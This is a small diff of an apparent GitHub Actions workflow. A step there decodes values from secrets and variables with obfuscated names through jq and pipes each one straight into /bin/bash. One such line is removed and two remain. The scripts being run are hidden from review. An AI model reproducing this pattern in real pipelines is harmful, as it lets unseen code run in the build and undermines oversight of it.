@@ -21,7 +21,6 @@ jobs:
           mzfk6: ${{ secrets.mzfk6 }}
         run: |
           printf '%s' "$mzfk6" | jq -r .djeof3599 | /bin/bash
-          printf '%s' "$fbxgx01" | jq -r .sjae5 | /bin/bash
           echo $nybgo9675 | jq -r .ydgd7080 | /bin/bash
 
       - name: Upload results
